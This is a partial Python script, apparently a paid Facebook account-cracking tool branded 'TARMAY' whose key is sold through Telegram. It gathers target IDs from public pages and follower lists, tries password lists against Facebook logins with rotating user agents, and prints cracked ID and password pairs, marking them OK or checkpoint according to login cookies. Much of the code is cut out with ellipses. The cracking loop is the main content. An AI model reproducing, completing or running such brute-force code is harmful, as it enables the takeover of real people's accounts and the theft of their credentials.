...
try:
	...
	print('[[\x1b[1;92mok 𝑻𝑨𝑹𝑴𝑨𝒀\x1b[1;97m] [\x1b[1;96mḘ̴̎R̷̐͜R̸̢͝O̸͕̐R̶͎̂ Į̴͑Ṉ̶͊T̵̺̔E̴̢͐Ṟ̷̅N̵̨̆E̵͇̾T̸̠̚A̴̲̕K̶̯͠A̶͚͆T̶̆͜ B̷̢͑Ỏ̴̦ C̴͆ͅR̴͘͟A̸̯͝C̸̡̒K̸͔͝I̷̠̿ Í̶̫M̴͉͂ Ţ̸͋Ỏ̵͖O̵̹͊L̵̦̓A̴̭̚ Ń̴̪Ä̷́ͅB̴͎͌E̷̕͜.̷̧͠.̵̞̈́.̴̳́...')
...
|̲̅̅●̲̅̅|̲̅̅=̲̅̅|̲̅̅●̲̅̅|𝑻𝑨𝑹𝑴𝑨𝒀 ᴄʀᴀᴄᴋ  |̲̅̅●̲̅̅|̲̅̅=̲̅̅|̲̅̅●̲̅̅|

|̲̅̅●̲̅̅|̲̅̅=̲̅̅|●|  ᴛᴏᴏʟ𝑻𝑨𝑹𝑴𝑨𝒀ʙʏ   |̲̅̅●̲̅̅|̲̅̅=̲̅̅|̲̅̅●̲̅̅|

|̲̅̅●̲̅̅|̲̅̅=̲̅̅|̲̅̅●̲̅̅| ɴᴏᴛᴇ 5$ ғᴏʀ ᴋᴇʏ ᴛᴇʟᴇɢʀᴀᴍ @𝒕𝒂𝒓𝒎𝒂𝒚_𝒔𝒉𝒂𝒘1  |̲̅̅●̲̅̅|̲̅̅=̲̅̅|̲̅̅●̲̅̅|

|̲̅̅●̲̅̅|̲̅̅=̲̅̅|̲̅̅●̲̅̅| 웃 𝑻𝑨𝑹𝑴𝑨𝒀  웃  |̲̅̅●̲̅̅|̲̅̅=̲̅̅|̲̅̅●̲̅̅|      ╰╮✾╭╯✯ ᴛᴏᴏʟ 𝒕𝒂𝒓𝒎𝒂𝒚 ✯╰╮✾╭╯
...
def public():
	...
	os.system('clear')
	print(logo)
	target = input('\n\033[0;1m[ \033[31;1m+ \033[0;1m] 𝑰𝑫: ')
	try:
...
def followers():
	...
	os.system('clear')
	print(logo)
	target = input('\033[0;1m[ + \033[0;1m] 𝑰𝑫: ')
	try:
...
def passwrd():
	...
	print('\033[0;1m[ \033[31;1m+ \033[0;1m] 𝐂𝐑𝐀𝐂𝐊 𝐆𝐎𝐎𝐃 𝐖𝐀𝐈𝐓 \033[0;1m( \033[32mDYNO CRACKER-𝐏𝐀𝐑𝐈𝐒 \033[0;1m)')
	...
	meno = input('\033[0;1m[ \033[31;1m+ \033[0;1m] 𝑬𝑵𝑻𝑬𝑹 ');menu()


def bapi(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r\033[0;1m[ \033[0;1m{loop} \033[0;1m• \033[1;91m{len(id)} \033[0;1m]  \033[0;1m[ \033[32;1m𝑶𝑲 \033[0;1m] \033[32;1m{𝑶𝑲}  \033[0;1m[ \033[33;1m𝑪𝑷 \033[0;1m] \033[33;1m{𝑪𝑷}"), 
	sys.stdout.flush() 
	...
	for pw in pwv: 
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print('\n')
				print(f'\033[0;1𝑭𝑩 \033[33;1m𝑻𝑨𝑹𝑴𝑨𝒀 𝑪𝑷: {idf};{pw}')
				cp+=1
				break
				...
				print('\n')
				print(f'\033[0;1m𝑭𝑩 \033[32;1m𝑻𝑨𝑹𝑴𝑨𝒀 𝑶𝑲: {idf};{pw}')
				ok+= 1
				break
...
def free(idf,pwv):
	...
	global ok
	global cp
	sys.stdout.write(f"\r\033[0;1m[ \033[34;1m{loop}:{len(id)} \033[0;1m]  \033[0;1m[ \033[32;1m{𝑶𝑲} \033[0;1m]  \033[0;1m[ \033[33;1m{𝑪𝑷} \033[0;1m]"), 
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
...
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print('\n')
				print(f'\033[33;1𝑻𝑨𝑹𝑴𝑨𝒀 𝑶𝑲:\n𝑭𝑩 𝑰𝑫: {idf}\n𝑭𝑩 𝑷𝑨𝑺𝑺: {pw}')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\n')
				print(f'\033[32;1m𝑻𝑨𝑹𝑴𝑨𝒀 𝑶𝑲:\n𝑭𝑩 𝑰𝑫: {idf}\n𝑭𝑩 𝑷𝑨𝑺𝑺: {pw}')
				ok+=1
				break
